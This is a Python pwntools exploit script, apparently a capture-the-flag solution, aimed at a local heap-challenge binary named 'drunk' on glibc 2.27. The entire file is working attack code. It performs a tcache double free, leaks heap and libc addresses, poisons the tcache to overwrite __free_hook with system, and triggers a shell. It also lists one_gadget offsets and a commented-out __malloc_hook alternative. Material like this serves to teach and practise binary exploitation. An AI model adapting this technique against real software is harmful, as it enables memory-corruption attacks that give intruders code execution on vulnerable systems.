from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])


io=process("./drunk")
elf=ELF("./drunk")
libc=ELF("./libc-2.27.so")

def add(n,c):
    io.sendlineafter(b"-->>>> \n",b"1")
    io.sendlineafter(b"cup:\n",str(n))
    io.sendlineafter(b"add?\n",c)

def delete(n):
    io.sendlineafter(b"-->>>> \n",b"2")
    io.sendlineafter(b"number: \n",str(n))

def show(n):
    io.sendlineafter(b"-->>>> \n",b"3")
    io.sendlineafter(b"left: \n",str(n))

def edit(n,cc):
    io.sendlineafter(b"-->>>> \n",b"4")
    io.sendlineafter(b"cup:\n",str(n))
    io.sendafter(b"refill\n",cc)


add(0x40,b"aaa") #0
add(0x40,b"/bin/sh\x00") #1

delete(0)
delete(0)
show(0)
leak_addr=u64(io.recv(6).ljust(8,b"\x00"))
print("leak_addr: "+hex(leak_addr))
heap_addr=leak_addr-0x260

add(0x40,p64(heap_addr+0x10)) #2
add(0x40,b"ddd") #3
add(0x40,b"\x07"*0x40) #4
delete(4)
show(4)
libc_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x70-libc.sym[b"__malloc_hook"]
print("libc_addr: "+hex(libc_addr))
malloc_hook=libc_addr+libc.sym[b"__malloc_hook"]
free_hook=libc_addr+libc.sym[b"__free_hook"]
realloc=libc_addr+libc.sym[b"__libc_realloc"]
sys_addr=libc_addr+libc.sym[b"system"]
one_gadget=[0x4f365,0x4f3c2,0x10a45c]
shell=libc_addr+one_gadget[2]


edit(4,b"\x00"*0x40)
delete(0)
delete(0)
add(0x40,p64(free_hook))
add(0x40,b"qqq")
add(0x40,p64(sys_addr))
# add(0x40,p64(malloc_hook-0x8))
# add(0x40,b"qqq")
# add(0x40,p64(shell)+p64(realloc+0x1))

gdb.attach(io)
pause()

io.sendlineafter(b"-->>>> \n",b"2")
io.sendlineafter(b"number: \n",b"1")


io.interactive()


# 0x4f365 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL

# 0x4f3c2 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a45c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
